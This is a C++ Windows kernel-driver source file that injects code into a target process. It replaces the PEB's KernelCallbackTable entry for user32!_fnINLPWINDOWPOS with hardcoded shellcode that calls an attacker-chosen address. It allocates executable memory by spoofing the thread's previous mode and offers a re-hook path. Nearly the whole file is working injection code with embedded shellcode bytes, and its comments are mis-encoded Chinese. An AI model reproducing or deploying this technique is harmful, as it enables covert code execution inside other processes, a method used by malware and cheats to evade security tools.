#include "inject.h"
#include "kernel.h"
#include "rw.h"
#include "need.h"

#define LG_DO do {
#define LG_WHILE } while (false);

#define KernelCallbackTableOffset	0x058
#define KernelCallbackTableSize		0x550

extern "C"
{
	UCHAR shellcode[80] = {0x50,0x53,0x51,0x52,0x56,0x57,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x9C,0x48,0x83,0xEC,0x28,0x48,0xB8,0xEF,0xCD,0xAB,0x89,0x67,0x45,0x23,0x01,0xFF,0xD0,0x48,0x83,0xC4,0x28,0x9D,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,0x41,0x58,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x68,0x78,0x56,0x34,0x12,0xC7,0x44,0x24,0x04,0x12,0x34,0x56,0x78,0xC3};
	UCHAR shellcode2[50] = {0xA0,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x3C,0x01,0x75,0x01,0xC3,0xB0,0x01,0xA2,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x48,0x33,0xC9,0x48,0x33,0xD2,0x4D,0x33,0xC0,0x4D,0x33,0xC9,0x48,0xB8,0x78,0x56,0x34,0x12,0x78,0x56,0x34,0x12,0xFF,0xD0,0xC3};
	ULONG KernelCallbackTableInjectPid = -1;
	ULONG64* FunctionPointer = NULL;
	UCHAR * isReHook = NULL;

	// KernelCallbackTableԶ��ת(֧��Win7 ~ Win10)(R3:֧��ע��, R0:��֧��ע��, �˷�ʽΪ��������)
	NTSTATUS KernelCallbackTableInject(HANDLE pid, ULONG64 call_address);

	void Inject::InitInject(){}

	NTSTATUS Inject::KernelCallbackTableInjectRegistry(HANDLE pid, ULONG64 call_address)
	{
		NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

		if (pid == (HANDLE)KernelCallbackTableInjectPid){
			if (FunctionPointer != NULL && isReHook){
				// ָ���к�����ַ���滻
				PEPROCESS eprocess;
				NTSTATUS NtStatus = PsLookupProcessByProcessId(pid, &eprocess);
				if (NtStatus != STATUS_SUCCESS)
					return NtStatus;

				KAPC_STATE ApcState;
				KeStackAttachProcess(eprocess, &ApcState);

				*FunctionPointer = call_address;
				*isReHook = NULL;

				KeUnstackDetachProcess(&ApcState);
				ObDereferenceObject(eprocess);
				return STATUS_SUCCESS;
			}
		}

		// �������Hook
		NtStatus = KernelCallbackTableInject(pid, call_address);
		if (!NT_SUCCESS(NtStatus))
			return NtStatus;

		return NtStatus;
	}

	NTSTATUS KernelCallbackTableInject(HANDLE pid, ULONG64 call_address)
	{
		if (call_address >= MmUserProbeAddress)
		{
			// ������ں˵�ַ����ʧ��
			return STATUS_INVALID_PARAMETER;
		}

		// ��ȡR3�����ں˽ṹ��
		PEPROCESS eprocess;
		NTSTATUS NtStatus = PsLookupProcessByProcessId(pid, &eprocess);
		if (NtStatus != STATUS_SUCCESS)
			return NtStatus;

		// �ҿ�
		KAPC_STATE ApcState;
		KeStackAttachProcess(eprocess, &ApcState);

		LG_DO

		UCHAR* peb32 = (UCHAR*)PsGetProcessWow64Process(eprocess);
		ULONG64* KernelCallbackTable = NULL;
		ULONG64* OriKernelCallbackTable = NULL;
		if (peb32 == NULL)
		{
			// 64λ
			// ��ȡPEB
			PPEB peb = PsGetProcessPeb(eprocess);
			if (!peb)
			{
				NtStatus = STATUS_UNSUCCESSFUL;
				break;
			}
			// ӳ��PEB�ڴ浽R0
			PMDL pMdl = NULL;
			UCHAR* map_peb = (UCHAR*)Rw::MdlMapAddress(&pMdl, peb, 0x400, UserMode);

			// ����PEB
			UCHAR* exe_shellcode = NULL;
			ULONG64* exe_KernelCallbackTable = NULL;
			UCHAR* exe_Mem = NULL;

			// ��Ŀ������������ڴ�
			UCHAR ori_mode;
			SetThreadPreviousMode(PsGetCurrentThread(), KernelMode, &ori_mode);
			SIZE_T needSize = 0x600;
			NtStatus = NtAllocateVirtualMemory(NtCurrentProcess(), (void**)&exe_Mem, 0, &needSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!NT_SUCCESS(NtStatus))
				break;
			RtlZeroMemory(exe_Mem, needSize);
			SetThreadPreviousMode(PsGetCurrentThread(), ori_mode, NULL);

			// 0x82 + 0x550
			exe_shellcode = exe_Mem;
			exe_KernelCallbackTable = (ULONG64*)(exe_Mem + sizeof(shellcode));
			UCHAR* exe_shellcode2 = (UCHAR*)(exe_Mem + sizeof(shellcode) + KernelCallbackTableSize);
			// ��ȡKernelCallbackTable 
			//peb+0x058
			OriKernelCallbackTable = *(ULONG64**)((ULONG64)map_peb + KernelCallbackTableOffset);

			// ����shellcode
			RtlCopyMemory(exe_shellcode, shellcode, sizeof(shellcode));
			// ����KernelCallbackTable
			RtlCopyMemory(exe_KernelCallbackTable, OriKernelCallbackTable, KernelCallbackTableSize);
			RtlCopyMemory(exe_shellcode2, shellcode2, sizeof(shellcode2));

			// �޸�shellcode
			ULONG64 ori_address = exe_KernelCallbackTable[0x11];
			ULONG64 flag_address = (ULONG64)exe_Mem + sizeof(shellcode);
			for (ULONG i = 0; i < sizeof(shellcode); i++)
			{
				uintptr_t pWrite = (uintptr_t)&exe_shellcode[i];
				if (*(ULONG64*)pWrite == 0x123456789ABCDEF)
				{
					*(ULONG64*)pWrite = (ULONG64)exe_shellcode2;
				}
				else if (*(ULONG32*)pWrite == 0x12345678)
				{
					*(ULONG32*)pWrite = (ULONG32)(ori_address & 0x0ffffffff);
				}
				else if (*(ULONG32*)pWrite == 0x78563412)
				{
					*(ULONG32*)pWrite = (ULONG32)((ori_address >> 32) & 0x0FFFFFFFF);
				}
			}
			// �޸�shellcode2
			for (int i = 0; i < sizeof(shellcode2); i++)
			{
				if (*(ULONG64*)&exe_shellcode2[i] == 0x1234567812345678)
				{
					*(ULONG64*)&exe_shellcode2[i] = call_address;
					FunctionPointer = (ULONG64*)&exe_shellcode2[i];
				}
				else if (*(ULONG64*)&exe_shellcode2[i] == 0x1111111111111111)
				{
					*(ULONG64*)&exe_shellcode2[i] = (ULONG64)(exe_shellcode2 + sizeof(shellcode2));
				}
			}

			// �ݹ۲�˺�����Win10��Win7���±���ͬ�ҳ�������
			// Win10 1809:0x11 user32!_fnINLPWINDOWPOS
			// Win7	SP1 :0x11 user32!_fnINLPWINDOWPOS
			// �滻Ŀ�꺯��
			exe_KernelCallbackTable[0x11] = (uintptr_t)exe_shellcode;
			// �滻KernelCallbackTable
			*(ULONG64*)((ULONG64)map_peb + KernelCallbackTableOffset) = (ULONG64)exe_KernelCallbackTable;

			KernelCallbackTableInjectPid = (ULONG)pid;
			isReHook = (UCHAR*)(exe_shellcode2 + sizeof(shellcode2));

			Rw::MdlUnMapAddress(pMdl, map_peb);
		}
		else
		{
			// 32 λ
		}

		LG_WHILE

		KeUnstackDetachProcess(&ApcState);
		ObDereferenceObject(eprocess);

		return STATUS_SUCCESS;
	}

}



